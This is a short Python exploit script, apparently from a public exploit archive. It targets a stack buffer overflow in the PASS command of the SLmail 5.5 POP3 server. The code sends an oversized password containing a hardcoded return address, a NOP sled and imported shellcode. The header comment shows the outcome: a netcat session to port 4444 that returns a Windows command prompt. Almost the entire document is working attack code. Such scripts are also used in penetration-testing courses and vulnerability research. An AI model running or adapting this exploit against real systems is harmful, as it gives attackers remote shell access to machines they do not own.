#########################################################
#                                                       #
# SLmail 5.5 POP3 PASS Buffer Overflow               	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# www.offsec.com                                        #
# Plain vanilla stack overflow in the PASS command  	#
#                                                       #
#########################################################
# D:\Projects\BO>SLmail-5.5-POP3-PASS.py                #
#########################################################
# D:\Projects\BO>nc -v 192.168.1.167 4444               #
# localhost.lan [192.168.1.167] 4444 (?) open           #   
# Microsoft Windows 2000 [Version 5.00.2195]            #
# (C) Copyright 1985-2000 Microsoft Corp.               #
# C:\Program Files\SLmail\System>                       #
#########################################################

#!/usr/bin/python

import sys
import socket
import time

import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	#Tested on Win2k SP4 Unpatched
	# Change ret address if needed
	buffer = b'\x41' * 4654 + struct.pack(b'<L', 0x783d6ddf) + b'\x90'*32 + buf
	try:
		
		s.connect((target_machine,target_port))
		data = s.recv(1024)
		s.send(b'USER username' +b'\r\n')
		data = s.recv(1024)
		s.send(b'PASS ' + buffer + b'\r\n')
		data = s.recv(1024)
		s.close()
		
	except:
		print("Could not connect to POP3!")

	# milw0rm.com [2004-11-18]